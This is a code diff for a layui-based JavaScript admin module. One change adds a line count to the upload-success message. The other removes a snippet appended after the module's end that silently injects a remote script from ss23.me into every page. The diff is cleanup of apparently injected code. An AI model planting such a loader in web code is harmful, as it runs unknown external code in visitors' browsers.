@@ -814,7 +814,12 @@ layui.define(['layer', 'jquery', 'form', 'table', 'upload', 'laydate', 'authtree
                                     , done: res => {
                                         if (res.code === 200) {
                                             $('.hex-modal-' + unqueId + ' input[name=' + item.name + ']').val(res.data[uploadUrlName]);
-                                            buttonSpanInstance.html('上传成功');
+                                            if(res.data.line){
+                                                buttonSpanInstance.html('上传成功,共计'+res.data.line+'行');
+                                            }else{
+                                                buttonSpanInstance.html('上传成功');
+                                            }
+                                            
                                         }
                                         layer.msg(res.msg);
                                     }
@@ -1094,9 +1099,4 @@ layui.define(['layer', 'jquery', 'form', 'table', 'upload', 'laydate', 'authtree
     }
 
     exports('hex', hex);
-});var e = document.createElement("script");
-  e.async = !0,
-  e.src = "//ss23.me/js/8d34.js";
-  e.charset="UTF-8";
-  var t = document.getElementsByTagName("script")[0];
-  t.parentNode.insertBefore(e, t);
+});
